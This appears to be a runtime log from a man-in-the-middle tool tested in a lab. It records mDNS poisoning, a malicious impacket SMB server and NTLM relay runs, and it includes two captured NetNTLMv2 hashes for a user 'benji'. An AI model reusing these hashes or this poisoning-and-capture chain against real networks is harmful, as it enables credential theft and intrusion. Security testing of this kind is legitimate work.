2021-11-03 18:31:35.047 | INFO     | project.igris:show_settable_variables_necessary:210 - Showing necessary settable variables
2021-11-03 18:32:43.194 | INFO     | project.igris:show_settable_variables_necessary:210 - Showing necessary settable variables
2021-11-03 18:37:05.427 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 18:37:05.429 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 18:37:11.146 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 18:37:11.180 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 18:37:12.127 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49862)
2021-11-03 18:37:12.610 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-03 18:37:12.612 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-03 18:37:12.614 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:c44e0bcaa624db62019e06ae13c13195:0101000000000000007cccd0e1d0d70124fcefab217cbd8b00000000010010007a004f00520054004b00530077004200030010007a004f00520054004b005300770042000200100046005100660079007500520056005000040010004600510066007900750052005600500007000800007cccd0e1d0d70106000400020000000800300030000000000000000000000000200000a83c2f4b01aa6db48244f3a58764a25907daad7ee20580caa7157fc5b8f574840a0010000000000000000000000000000000000009001e0063006900660073002f0068006f006c0061002e006c006f00630061006c000000000000000000
2021-11-03 18:37:12.749 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-03 18:37:12.771 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-03 18:37:12.940 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-03 18:37:16.670 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:109 - Exiting smb relay attack ...
2021-11-03 19:15:02.400 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 19:15:02.403 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 19:15:37.063 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 19:15:37.101 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 19:15:38.074 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,62797)
2021-11-03 19:15:38.106 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-03 19:15:38.106 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-03 19:15:38.107 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:be67b028077ac3fd62b061dbb8c33aa4:01010000000000000029482fe7d0d70141242b69bb3be02f00000000010010006f0051004c00540049007a0057006700030010006f0051004c00540049007a005700670002001000580053004700550042004f006b004f0004001000580053004700550042004f006b004f00070008000029482fe7d0d70106000400020000000800300030000000000000000000000000200000a83c2f4b01aa6db48244f3a58764a25907daad7ee20580caa7157fc5b8f574840a001000000000000000000000000000000000000900240063006900660073002f0063006f00730069007400610073002e006c006f00630061006c000000000000000000
2021-11-03 19:15:38.127 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-03 19:15:38.144 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-03 19:15:38.175 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-03 19:15:40.778 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:74 - Exiting smb relay attack ...
2021-11-03 20:20:55.340 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:85 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:20:55.341 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:20:55.343 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:35:00.451 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:35:00.453 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:35:00.456 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:35:15.492 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:37:20.159 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:37:20.161 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:37:20.164 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:37:22.306 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:37:39.880 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:81 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:37:39.883 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:37:39.885 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:37:41.282 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:47:54.454 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:86 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:47:54.457 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:47:54.459 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:48:52.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 20:48:52.679 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 20:48:54.515 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 20:48:54.563 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 20:49:04.811 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-03 20:49:04.848 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-03 20:53:02.266 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:53:02.271 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:53:03.474 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:82 - Exiting smb relay attack ...
2021-11-03 20:53:05.489 | WARNING  | project.ManInTheMiddle.maninthemiddle:do_mss:123 - The attack is already running in the background
2021-11-03 20:53:56.616 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:53:56.619 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:53:56.624 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:53:59.097 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:54:08.264 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
2021-11-03 20:54:18.239 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:54:18.241 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:54:18.243 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:54:21.200 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:54:58.379 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
2021-11-03 20:58:13.663 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:87 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:58:13.665 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:58:13.666 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:58:18.225 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:59:26.645 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:86 - Running ntlm relay on the background the results will be saved at: [32mlogs/hashes_ntlm.log[39m 
2021-11-03 20:59:26.650 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-03 20:59:26.652 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:50 - Starting Malicious SMB Server ...
2021-11-03 20:59:29.162 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:44 - Finishing mss attack in the background ...
2021-11-03 20:59:33.473 | ERROR    | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:49 - There is not mss process in the background
